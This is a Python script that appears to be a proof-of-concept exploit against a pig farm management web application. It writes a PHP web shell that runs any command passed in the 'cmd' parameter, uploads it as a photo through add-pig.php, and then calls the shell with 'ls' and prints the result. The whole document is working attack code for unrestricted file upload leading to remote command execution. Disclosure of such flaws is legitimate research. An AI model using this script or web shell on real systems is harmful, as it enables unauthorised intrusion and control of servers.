import requests


php_code = """<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
} else {
    echo "No command provided.";
}
?>"""

with open("command.php", "w") as file:
    file.write(php_code)

print("command.php file created successfully.")

url = "http://localhost/pig/add-pig.php" 

# Prepare the data payload
data = {
    'submit': 'Upload',
    'pigno': '1234',
    'weight': '150',
    'arrived': '2024-07-04',
    'breed': 'Duroc',
    'remark': 'Healthy',
    'status': 'Good',
    'gender': 'Male'
}

# Prepare the files payload
files = {
    'pigphoto': ('command.php', open('command.php', 'rb'), 'application/x-php')
}

# Make the POST request to upload the file
response = requests.post(url, data=data, files=files)

if response.status_code == 200:
    print("File uploaded successfully.")
    command_url = "http://localhost/pig/uploadfolder/command.php"
    command = "ls"
    command_response = requests.get(f"{command_url}?cmd={command}")
    print(123213)
    if command_response.status_code == 200:
        print("Command executed successfully.")
        print("Response:")
        print(command_response.text)
    else:
        print(f"Failed to execute command. Status code: {command_response.status_code}")
else:
    print(f"Failed to upload file. Status code: {response.status_code}")

